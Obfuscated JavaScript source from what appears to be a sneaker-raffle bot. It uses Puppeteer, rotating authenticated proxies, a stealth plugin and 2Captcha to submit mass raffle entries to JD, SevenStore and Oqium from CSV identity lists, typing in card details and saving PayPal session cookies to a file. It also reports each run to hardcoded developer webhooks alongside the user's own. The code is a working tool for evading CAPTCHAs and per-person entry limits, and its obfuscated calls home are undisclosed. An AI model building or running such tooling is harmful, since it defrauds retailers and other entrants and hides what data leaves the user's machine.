            EMBEDS['errorDEV'] = { 'embeds': [_0x4ba6f0] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], EMBEDS['errorDEV']), await _0x2ebaaf(_0x2664b3, EMBEDS['errorDEV']), _0x2d25b9 = 'yes';
        } finally {
            _0x4e5151 && _0x4e5151['close']();
            if (_0x2d25b9 == 'yes' && _0x6265ad != 0x5) {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x2763f0['name'] + ']\x20Task\x20' + (_0x2a8d16 + 0x1) + '\x20:\x20Retrying')), _0x2a8d16 = _0x2a8d16 - 0x1, _0x6265ad = _0x6265ad + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x4cf02e(_0x98bddd, _0x38df1a, _0x1afbb5) {
    var _0xccb958 = ![], _0x17a59c = ![];
    if (_0x26509c['captchaKey'] == '' || _0x26509c['captchaKey'] == undefined)
        return console['log'](_0x1ee4d0['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x17bd30 = 0x0; _0x17bd30 < _0x38df1a['length']; _0x17bd30++) {
        var _0x5ed295, _0x1bae7d = [{
            'type': 'rich',
            'title': 'Succesful\x20JD\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'Product',
                    'value': '' + _0x38df1a[_0x17bd30]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x38df1a[_0x17bd30]['Size']
                },
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }];
        const _0x394365 = { 'embeds': _0x1bae7d };
        _0x2be893(_0x98bddd['name'] + '\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20/\x20' + _0x38df1a['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x38df1a, _0x17bd30);
        var _0x7493e0 = await _0x4ec2d3(_0x38df1a[_0x17bd30], _0x98bddd, 'dev', ![]), _0x2820d6 = await _0x4ec2d3(_0x38df1a[_0x17bd30], _0x98bddd, 'pub', ![]);
        const _0x11c6de = {
            'succesDEVMSG': { 'embeds': [_0x7493e0] },
            'succesPUBMSG': { 'embeds': [_0x2820d6] }
        };
        if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
            try {
                await _0x2ebaaf(_0x26509c['webhook'], _0x11c6de['succesDEVMSG']);
            } catch {
            }
        await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x11c6de['succesDEVMSG']), await _0x5df609(0xc8);
        try {
            await _0x2ebaaf(_0x19c58b, _0x11c6de['succesPUBMSG']);
        } catch {
        }
        if (_0x38df1a[_0x17bd30]['Email'] == '' || _0x38df1a[_0x17bd30]['Url'] == '' || _0x38df1a[_0x17bd30]['FirstName'] == '' || _0x38df1a[_0x17bd30]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x57d163[taskModule]['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x26509c['useRandomProxy'] = ![])
            var _0x328609 = _0x1afbb5[_0x17bd30]['split'](':');
        else
            var _0x450fd6 = Math['round'](Math['random']() * (_0x1afbb5['length'] - 0x1)), _0x328609 = _0x1afbb5[_0x450fd6]['split'](':');
        const _0x4a30a0 = await _0x2d6840['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x328609[0x0] + ':' + _0x328609[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x4d4013 = await _0x4a30a0['newPage']();
            await _0x4d4013['authenticate']({
                'username': '' + _0x328609[0x2],
                'password': '' + _0x328609[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4d4013['setRequestInterception'](!![]), _0x4d4013['on']('request', _0x222dc3 => {
                _0x222dc3['resourceType']() === 'image' || _0x222dc3['resourceType']() === 'font' || _0x222dc3['resourceType']() === 'media' ? _0x222dc3['abort']() : _0x222dc3['continue']();
            }), await _0x4d4013['goto']('' + _0x38df1a[_0x17bd30]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0xea60
            });
            try {
                await _0x4d4013['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
            } catch {
                throw new Error('Not\x20an\x20Active\x20Raffle');
            }
            console['log'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x4d4013['type']('#comp_firstname', '' + _0x38df1a[_0x17bd30]['FirstName']), await _0x4d4013['waitForSelector']('#comp_lastname'), await _0x4d4013['type']('#comp_lastname', '' + _0x38df1a[_0x17bd30]['LastName']), await _0x4d4013['waitForSelector']('#comp_email'), await _0x4d4013['type']('#comp_email', '' + _0x38df1a[_0x17bd30]['Email']), await _0x4d4013['waitForSelector']('#comp_paypalemail'), await _0x4d4013['type']('#comp_paypalemail', '' + _0x38df1a[_0x17bd30]['Email']), await _0x4d4013['waitForSelector']('#comp_mobile_end'), await _0x4d4013['type']('#comp_mobile_end', '' + _0x38df1a[_0x17bd30]['Phone']), await _0x4d4013['waitForSelector']('#comp_dob'), await _0x4d4013['type']('#comp_dob', '08/09/1992'), console['log'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Choosing\x20Size');
            if (_0x38df1a[_0x17bd30]['Size'] == 'RANDOM') {
                const _0x109055 = await _0x4d4013['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x364827 => {
                    return _0x364827['map'](_0x4e5fe3 => _0x4e5fe3['value']);
                });
                var _0x18faca = Math['round'](Math['random']() * (_0x109055['length'] - 0x2));
                await _0x4d4013['select']('#shoesize', _0x109055[_0x18faca + 0x1]), await _0x5df609(0x3e8);
            } else {
                const _0x45d3c6 = await _0x4d4013['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x3b6e54 => {
                    return _0x3b6e54['map'](_0x836c9d => _0x836c9d['innerText']);
                }), _0x427522 = await _0x4d4013['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x22f897 => {
                    return _0x22f897['map'](_0x25da77 => _0x25da77['value']);
                });
                var _0x254423 = _0x38df1a[_0x17bd30]['Size'];
                for (var _0x10738a = 0x1; _0x10738a < _0x427522['length']; _0x10738a++) {
                    var _0x3d8c01 = _0x45d3c6[_0x10738a]['split']('\x20')[0x0];
                    if (_0x3d8c01 == _0x254423) {
                        await _0x4d4013['select']('#shoesize', _0x427522[_0x10738a]);
                        break;
                    } else {
                        if (_0x10738a + 0x1 == _0x427522['length'])
                            throw new Error('Size\x20Not\x20Found..');
                    }
                }
            }
            await _0x4d4013['waitForSelector']('#comp_address1'), await _0x4d4013['type']('#comp_address1', _0x38df1a[_0x17bd30]['Address1'] + '\x20' + _0x38df1a[_0x17bd30]['HouseNumber']), await _0x4d4013['waitForSelector']('#comp_address2'), await _0x4d4013['type']('#comp_address2', '' + _0x38df1a[_0x17bd30]['Address2']), await _0x4d4013['waitForSelector']('#comp_address2'), await _0x4d4013['type']('#comp_address3', '' + _0x38df1a[_0x17bd30]['City']), await _0x4d4013['waitForSelector']('#comp_postcode'), await _0x4d4013['type']('#comp_postcode', '' + _0x38df1a[_0x17bd30]['Zip']), console['log'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5df609(0x4b0), await _0x4d4013['click']('label#emailhold'), await _0x5df609(0x5dc), await _0x4d4013['click']('#preauth_tandc_email\x20>\x20label'), await _0x5df609(0x5dc), await _0x4d4013['click']('#submit'), await _0x4d4013['waitForSelector']('#paymentWrap'), console['log'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20' + _0x1ee4d0['blue']('Awaiting\x20Paypal\x20Payment')), _0x4a30a0['on']('targetcreated', async _0xe541a0 => {
                if (_0xe541a0['type']() === 'page') {
                    const _0x4b897b = await _0xe541a0['page']();
                    async function _0x7120ec() {
                        try {
                            await _0x4d4013['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x17a59c = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x141b00() {
                        try {
                            await _0x4d4013['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0xccb958 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x141b00(), _0x7120ec(), await _0x5df609(0x493e0);
                }
            });
            async function _0x5ec68d() {
                for (let _0x392ef0 = 0x0; _0x392ef0 < 0x12c; _0x392ef0++) {
                    if (_0xccb958 == !![]) {
                        console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
                            try {
                                await _0x2ebaaf(_0x26509c['webhook'], _0x11c6de['succesDEVMSG']);
                            } catch {
                            }
                        await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x11c6de['succesDEVMSG']), await _0x5df609(0xc8);
                        try {
                            await _0x2ebaaf(_0x19c58b, _0x11c6de['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x17a59c)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x5df609(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x5df609(0xbb8), await _0x4d4013['click']('.zoid-outlet'), await _0x5df609(0x7d0), await _0x5ec68d();
        } catch (_0x5c724f) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x98bddd['name'] + ']\x20Task\x20' + (_0x17bd30 + 0x1) + '\x20:\x20' + _0x5c724f)), _0x5ed295 = '' + _0x5c724f;
            var _0x1ab61f = await _0x4ec2d3(_0x38df1a[_0x17bd30], _0x98bddd, 'dev', !![], _0x5ed295);
            _0x11c6de['errorDEV'] = { 'embeds': [_0x1ab61f] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x11c6de['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x11c6de['errorDEV']);
        } finally {
            _0x4a30a0 && _0x4a30a0['close'](), console['log']('Waiting\x20for\x20' + _0x26509c['delay'] + '\x20ms'), await _0x5df609(_0x26509c['delay']);
        }
    }
}
async function _0x41d374(_0x4f1d75, _0x2b95b6, _0x1f0d4b) {
    _0x2d6840['use'](_0x4c8616()), _0x2d6840['use'](_0x2e9f9f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x26509c['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0xf05527 = 0x0; _0xf05527 < _0x2b95b6['length']; _0xf05527++) {
        _0x2be893(_0x4f1d75['name'] + '\x20Task\x20' + (_0xf05527 + 0x1) + '\x20/\x20' + _0x2b95b6['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8);
        var _0x232113 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Product',
                    'value': '' + _0x2b95b6[_0xf05527]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x2b95b6[_0xf05527]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x26509c['version']
                }
            ]
        }];
        const _0x3e8bef = { 'embeds': _0x232113 };
        await _0x5a7b4a(_0x2b95b6, _0xf05527);
        if (_0x2b95b6[_0xf05527]['Email'] == '' || _0x2b95b6[_0xf05527]['Password'] == '' || _0x2b95b6[_0xf05527]['FirstName'] == '' || _0x2b95b6[_0xf05527]['LastName'] == '') {
            console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x2b95b6[_0xf05527]['Password'] == '' || _0x2b95b6[_0xf05527]['Password'] == undefined) && (_0x2b95b6[_0xf05527]['Password'] = 'ErehsaWonRaj1!');
        if (_0x26509c['useRandomProxy'] = ![])
            var _0xc3c760 = _0x1f0d4b[_0xf05527]['split'](':');
        else
            var _0xc49b9d = Math['round'](Math['random']() * (_0x1f0d4b['length'] - 0x1)), _0xc3c760 = _0x1f0d4b[_0xc49b9d]['split'](':');
        const _0xed5a4a = await _0x2d6840['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0xc3c760[0x0] + ':' + _0xc3c760[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x15c555 = await _0xed5a4a['newPage']();
            await _0x15c555['authenticate']({
                'username': '' + _0xc3c760[0x2],
                'password': '' + _0xc3c760[0x3]
            }), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x15c555['setRequestInterception'](!![]), _0x15c555['on']('request', _0x1ff449 => {
                _0x1ff449['resourceType']() === 'image' || _0x1ff449['resourceType']() === 'font' || _0x1ff449['resourceType']() === 'media' ? _0x1ff449['abort']() : _0x1ff449['continue']();
            }), await _0x15c555['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x15c555['goto']('' + _0x2b95b6[_0xf05527]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x15c555['waitForSelector']('#btnPdpAtb'), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x2b95b6[_0xf05527]['Size']);
            const _0x134cbf = await _0x15c555['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x415d60 => {
                return _0x415d60['map'](_0x3fce92 => _0x3fce92['innerText']);
            }), _0x13e5ac = await _0x15c555['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x3f580e = ![];
            if (_0x2b95b6[_0xf05527]['Size'] == 'RANDOM') {
                var _0xc1434 = Math['round'](Math['random']() * (_0x13e5ac['length'] - 0x1));
                await _0x13e5ac[_0xc1434]['click']();
            } else
                for (var _0x2f973c = 0x0; _0x2f973c < _0x134cbf['length']; _0x2f973c++) {
                    if (_0x134cbf[_0x2f973c] != _0x2b95b6[_0xf05527]['Size'])
                        continue;
                    try {
                        await _0x13e5ac[_0x2f973c]['click']();
                    } catch {
                        console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x3f580e = !![];
                    }
                }
            if (_0x3f580e)
                continue;
            await _0x5df609(0x578), await _0x15c555['click']('#btnPdpAtb'), await _0x15c555['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x5df609(0x3e8), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x15c555['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x15c555['waitForSelector']('#email'), await _0x15c555['type']('#email', _0x2b95b6[_0xf05527]['Email']), await _0x5df609(0x226), await _0x15c555['click']('#guest-submit'), await _0x5df609(0x1b58), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x15c555['waitForSelector']('#firstname'), await _0x15c555['type']('#firstname', _0x2b95b6[_0xf05527]['FirstName'], 0x1f4), await _0x5df609(0x190), await _0x15c555['waitForSelector']('#surname'), await _0x15c555['type']('#surname', _0x2b95b6[_0xf05527]['LastName'], 0x1f4), await _0x5df609(0x190), await _0x15c555['waitForSelector']('#mobile'), await _0x15c555['type']('#mobile', _0x2b95b6[_0xf05527]['Phone'], 0x1f4), await _0x5df609(0x190), await _0x15c555['click']('#enterManualDiv'), await _0x5df609(0x5dc), await _0x15c555['waitForSelector']('#address1'), await _0x15c555['type']('#address1', _0x2b95b6[_0xf05527]['Address1'] + '\x20' + _0x2b95b6[_0xf05527]['HouseNumber'], 0x226), await _0x5df609(0x384), await _0x15c555['waitForSelector']('#address2'), await _0x15c555['type']('#address2', '' + _0x2b95b6[_0xf05527]['Address2'], 0x226), await _0x5df609(0x320);
            const _0x3c2cf5 = await _0x15c555['$$eval']('#countryselect_view3\x20>\x20option', _0x34a2ab => {
                return _0x34a2ab['map'](_0x5c6489 => _0x5c6489['value']);
            });
            var _0x25dfa0;
            for (var _0x131714 = 0x0; _0x131714 < _0x3c2cf5['length']; _0x131714++) {
                if (_0x3c2cf5[_0x131714]['startsWith']('' + _0x2b95b6[_0xf05527]['Country'])) {
                    _0x25dfa0 = _0x3c2cf5[_0x131714];
                    break;
                }
                continue;
            }
            await _0x15c555['select']('#countryselect_view3', '' + _0x25dfa0), await _0x15c555['waitForSelector']('#address4'), await _0x15c555['type']('#address4', '' + _0x2b95b6[_0xf05527]['City'], 0x1f4), await _0x5df609(0x384), await _0x15c555['waitForSelector']('#postcode'), await _0x15c555['type']('#postcode', '' + _0x2b95b6[_0xf05527]['Zip'], 0x1f4), await _0x5df609(0x4b0);
            const _0x3e3fbc = await _0x15c555['url']();
            console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x434c9a = _0x3e3fbc['split']('?')[0x1], _0x5de109 = await _0x15c555['$']('#co_address_submit');
            await _0x5de109['evaluate'](_0x2cb61c => _0x2cb61c['click']()), await _0x5df609(0x1388), await _0x15c555['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x434c9a), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x15c555['waitForSelector']('#paymentbuttons'), await _0x5df609(0x1388), await _0x15c555['click']('#paymentbuttons\x20>\x20div'), await _0x5df609(0x1c2), await _0x15c555['waitForSelector']('#card-number'), await _0x15c555['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x21bf4b = await _0x15c555['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x3b24aa = await _0x21bf4b['contentFrame']();
            await _0x3b24aa['waitForSelector']('.InputContainer'), await _0x3b24aa['click']('.InputContainer\x20>\x20input'), await _0x5df609(0x578), await _0x15c555['type']('#card-number', '' + _0x2b95b6[_0xf05527]['CreditNumber']), await _0x5df609(0xfa), await _0x15c555['type']('#card-expiry', '' + _0x2b95b6[_0xf05527]['ExpiryDate']), await _0x5df609(0xfa), await _0x15c555['type']('#card-cvc', '' + _0x2b95b6[_0xf05527]['CVV']), await _0x5df609(0x7d0), await _0x15c555['click']('#card-button'), console['log'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x15c555['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x2ebaaf(_0xa7232c, _0x3e8bef);
            } catch {
                console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x203DS\x20Failed')), _0x232113[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x232113[0x0]['description'] = '3DS\x20Failed', await _0x2ebaaf(_0x2664b3, _0x3e8bef);
            }
        } catch (_0x7b5b71) {
            console['log'](_0x1ee4d0['red'](_0x4db3b7() + '\x20[' + _0x4f1d75['name'] + ']\x20Task\x20' + (_0xf05527 + 0x1) + '\x20:\x20' + _0x7b5b71)), _0x232113[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x232113[0x0]['description'] = '' + _0x7b5b71, await _0x2ebaaf(_0x2664b3, _0x3e8bef);
        } finally {
            _0xed5a4a && _0xed5a4a['close']();
            if (_0xf05527 + 0x1 == _0x2b95b6['length']) {
                console['log'](_0x1ee4d0['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x5df609(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x26509c['AfewDelay'] + '\x20ms'), await _0x5df609(_0x26509c['AfewDelay']);
        }
    }
}
async function _0x4f98d3(_0x23db06, _0x131b04, _0x36dfda, _0x41e574, _0x38476c) {
    var _0x1f5b54, _0x18e1b8 = {}, _0x321ee8 = [], _0xcd5e6b = {}, _0x5ac53f = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x41e574 && (_0x41e574 = {});
    if (_0x131b04 != 'ver') {
        _0x2be893(_0x36dfda['name'] + '\x20Task\x20' + (_0x23db06 + 0x1) + '\x20/\x20' + _0x41e574['length'] + '\x20||\x20File:\x20' + _0x21572d + '\x20Proxies:\x20' + _0x246cb8), await _0x5a7b4a(_0x41e574, _0x23db06), _0x321ee8 = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x136a13
                },
                {
                    'name': 'Size',
                    'value': '' + _0x41e574[_0x23db06]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x26509c['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x23a95c
                }
            ]
        }], _0xcd5e6b = { 'embeds': _0x321ee8 }, _0x18e1b8 = _0x36dfda['data'];
        _0x131b04 == 'exp' ? _0x18e1b8['data']['attributes']['email'] = '' + _0x41e574[_0x23db06]['FirstName'] + _0x41e574[_0x23db06]['LastName'] + _0x26509c['catchall'] : _0x18e1b8['data']['attributes']['email'] = '' + _0x41e574[_0x23db06]['Email'];
        if (_0x41e574[_0x23db06]['Size'] == 'RANDOM') {
        }
        _0x18e1b8['data']['attributes']['properties']['$first_name'] = '' + _0x41e574[_0x23db06]['FirstName'], _0x18e1b8['data']['attributes']['properties']['$last_name'] = '' + _0x41e574[_0x23db06]['LastName'], _0x18e1b8['data']['attributes']['properties']['$address1'] = _0x41e574[_0x23db06]['Address1'] + '\x20' + _0x41e574[_0x23db06]['Address2'] + '\x20' + _0x41e574[_0x23db06]['HouseNumber'], _0x18e1b8['data']['attributes']['properties']['$zip'] = '' + _0x41e574[_0x23db06]['Zip'], _0x18e1b8['data']['attributes']['properties']['$city'] = '' + _0x41e574[_0x23db06]['City'], _0x18e1b8['data']['attributes']['properties']['$country'] = '' + _0x41e574[_0x23db06]['Country'], _0x18e1b8['data']['attributes']['properties']['Size'] = '' + _0x41e574[_0x23db06]['Size'], _0x18e1b8['data']['attributes']['properties']['$phone_number'] = '' + _0x41e574[_0x23db06]['Phone'], _0x18e1b8['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x41e574[_0x23db06]['Follower'];
    }
    if (_0x26509c['useRandomProxy'] = ![])
        var _0x503768 = _0x38476c[_0x23db06]['split'](':');
    else
        var _0x1a681d = Math['round'](Math['random']() * (_0x38476c['length'] - 0x1)), _0x503768 = _0x38476c[_0x1a681d]['split'](':');
    var _0x43116b = {
        'jar': _0x6db637,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x36dfda['url'],
        'headers': _0x36dfda['headers'],
        'body': JSON['stringify'](_0x18e1b8),
        'proxy': 'http://' + _0x503768[0x2] + ':' + _0x503768[0x3] + '@' + _0x503768[0x0] + ':' + _0x503768[0x1]
    };
    return _0x131b04 != 'ver' && (_0x43116b['url'] = _0x36dfda['url'], _0x43116b['headers'] = _0x36dfda['headers']), _0x131b04 == 'ver' && (_0x43116b['method'] = 'GET'), new Promise(function (_0x25bd9c, _0xf04658) {
        callback = async (_0x4b462e, _0x2f2977, _0x42e1d7) => {
            if (!_0x4b462e && _0x2f2977['statusCode'] == 0xca || !_0x4b462e && _0x2f2977['statusCode'] == 0xc8) {
                if (_0x131b04 != 'ver') {
                    var _0x4b774e = await _0x4ec2d3(_0x41e574[_0x23db06], _0x36dfda, 'dev', ![]), _0x3f5537 = await _0x4ec2d3(_0x41e574[_0x23db06], _0x36dfda, 'pub', ![]);
                    const _0x25bb64 = {
                        'succesDEVMSG': { 'embeds': [_0x4b774e] },
                        'succesPUBMSG': { 'embeds': [_0x3f5537] }
                    };
                    if (_0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '')
                        try {
                            await _0x2ebaaf(_0x26509c['webhook'], _0x25bb64['succesDEVMSG']);
                        } catch {
                        }
                    await _0x5df609(0xc8), await _0x2ebaaf(_0xa7232c, _0x25bb64['succesDEVMSG']), await _0x5df609(0xc8);
                    try {
                        await _0x2ebaaf(_0x19c58b, _0x25bb64['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x25bd9c(console['log'](_0x1ee4d0['green'](_0x4db3b7() + '\x20[' + _0x36dfda['name'] + ']\x20Task\x20' + (_0x23db06 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x131b04 != 'ver') {
                    var _0x5fd467 = '' + _0x4b462e, _0x4c29a5 = await _0x4ec2d3(_0x41e574[_0x23db06], _0x36dfda, 'dev', !![], _0x5fd467), _0x2e0e28 = {};
                    _0x2e0e28['errorDEV'] = { 'embeds': [_0x4c29a5] }, _0x26509c['webhook'] != undefined && _0x26509c['webhook'] != '' && await _0x2ebaaf(_0x26509c['webhook'], _0x2e0e28['errorDEV']), await _0x2ebaaf(_0x2664b3, _0x2e0e28['errorDEV']);
                }
                _0xf04658(console['log'](_0x4db3b7() + '\x20[' + _0x36dfda['name'] + ']\x20Task\x20' + (_0x23db06 + 0x1) + ':\x20' + _0x4b462e));
            }
        };
        try {
            _0x131b04 != 'ver' && console['log'](_0x4db3b7() + '\x20[' + _0x36dfda['name'] + ']\x20Task\x20' + (_0x23db06 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x18e1b8['data']['attributes']['email']), _0x434a82(_0x43116b, callback);
        } catch (_0x34ebb2) {
            console['log'](_0x4db3b7() + '\x20Task\x20' + (_0x23db06 + 0x1) + ':\x20' + _0x34ebb2);
        }
    });
}
;
async function _0x45bbf9(_0x4ede4c, _0x436cda, _0x296843) {
    var _0x3d834e;
    _0x2be893('' + _0x436cda);
    var _0x131011 = _0x296843[0x0]['split'](':');
    const _0x3181ea = await _0x2d6840['launch']({
        'headless': ![],
        'args': [
            '--proxy-server=' + _0x131011[0x0] + ':' + _0x131011[0x1],
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-web-security',
            '--disable-features=IsolateOrigins',
            '\x20--disable-site-isolation-trials'
        ]
    });
    try {
        console['log'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Getting\x20Session');
        const _0x2e0f77 = JSON['parse'](_0x2c62e3['readFileSync']('sessions/log.json')), _0x5d1515 = await _0x3181ea['newPage']();
        await _0x5d1515['authenticate']({
            'username': '' + _0x131011[0x2],
            'password': '' + _0x131011[0x3]
        }), await _0x5d1515['setViewport']({
            'width': 0x230,
            'height': 0x2d0
        }), await _0x5d1515, await _0x5d1515['goto']('https://www.paypal.com/signin');
        try {
            console['log'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Log\x20in\x20to\x20your\x20Paypal\x20account..'), await _0x5d1515['waitForSelector']('#cwBalance', { 'timeout': 0x493e0 }), console['log'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Successfully\x20logged\x20in'), await _0x5df609(0x2710), _0x3d834e = await _0x5d1515['cookies'](), _0x2c62e3['writeFileSync']('sessions/log.json', '' + JSON['stringify'](_0x3d834e));
        } catch (_0x351032) {
            throw new Error('Login\x20session\x20expired\x20' + _0x351032);
        }
        for (var _0x4e0207 = 0x0; _0x4e0207 < _0x4ede4c['length']; _0x4e0207++) {
            console['log'](_0x4db3b7() + '\x20[' + _0x436cda + ']\x20Task\x20' + (_0x4e0207 + 0x1) + '\x20:\x20Starting\x20Verification'), _0x2be893(_0x436cda + '\x20Task\x20' + (_0x4e0207 + 0x1) + '\x20/\x20' + _0x4ede4c['length']);
            const _0x1a8b74 = await _0x3181ea['newPage']();
            await _0x1a8b74['goto']('' + _0x4ede4c[_0x4e0207], { 'waitUntil': 'networkidle2' }), await _0x5df609(0xbb8);
            try {
                const _0x2e47ab = await _0x1a8b74['$']('#challenge-heading');
